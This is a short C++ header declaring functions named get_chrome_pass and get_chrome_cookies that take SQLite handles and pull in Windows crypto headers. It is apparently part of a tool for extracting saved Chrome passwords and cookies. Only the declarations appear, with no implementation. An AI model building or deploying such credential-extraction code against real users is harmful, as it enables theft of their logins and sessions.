#ifndef TOOLS_HPP
#define TOOLS_HPP

#include <sstream>
#include <iostream>
#include "sqlite3.h"

#if defined(__WIN64__)

    #include <windows.h>
    #include <Wincrypt.h>
    #include <tchar.h>

    std::stringstream get_chrome_pass(sqlite3 *db);
    std::stringstream get_chrome_cookies(sqlite3 *db);
    int callback(void *NotUsed, int argc, char **argv, char **azColName);

#elif defined(__linux__)

    std::stringstream get_chrome_pass(sqlite3* db);

#endif

#endif //TOOLS_HPP
